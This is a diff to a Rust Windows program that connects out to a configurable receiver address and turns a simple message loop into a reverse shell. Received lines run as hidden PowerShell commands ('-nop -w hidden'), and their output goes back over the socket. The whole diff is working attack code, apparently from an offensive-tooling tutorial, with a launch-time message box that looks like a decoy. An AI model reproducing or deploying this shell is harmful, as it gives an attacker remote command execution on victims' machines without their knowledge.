@@ -1,9 +1,12 @@
-use std::{io::{Write, BufWriter, BufReader, BufRead}, net};
+use std::{io::{Write, BufWriter, BufReader, BufRead}, net, process::Command};
 use windows::Win32::UI::WindowsAndMessaging::{MessageBoxA, MESSAGEBOX_STYLE};
 use windows::core::PCSTR;
 use windows::Win32::Foundation::HWND;
 
-const CONNECT_ADDRESS: &str = "192.168.1.111:8001";
+/// 
+/// The receiver address. Change this!
+/// 
+const CONNECT_ADDRESS: &str = "127.0.0.1:8001";
 
 ///
 /// Displays a Windows MessageBox at launch
@@ -46,13 +49,31 @@ fn main() {
 
         // Send our prompt
         tx.write("\nPS $> ".as_bytes()).unwrap();
+        // This ensure the  BufWriter data has been sent
+        tx.flush().unwrap();
 
         // Handle what we get back
         match rx.read_line(&mut read_buf) {
+
             Ok(bytes_written) => {
                 if bytes_written > 0 {
-                    let msg = read_buf.trim();
-                    println!("{msg}");
+                    let cmd = read_buf.trim();
+
+                    // Use the Command builder pattern to construct our
+                    // not-at-all-stealthy command
+                    let output = Command::new("powershell")
+                    .arg("-nop")
+                    .arg("-w")
+                    .arg("hidden")
+                    .arg("-c")
+                    .arg(format!("{cmd}"))
+                    .output()
+                    .expect("Command failed!");  
+
+                    // Join stdout and stderr in the output
+                    tx.write(&output.stdout).unwrap();
+                    tx.write(&output.stderr).unwrap();
+                    tx.flush().unwrap();
 
                 } else {
                     println!("Connection closed."); 
@@ -61,8 +82,6 @@ fn main() {
             },
             Err(_) => { println!("Connection closed."); break; }
         }
-        // This ensure the  BufWriter data has been sent
-        tx.flush().unwrap();
     }
 
 }
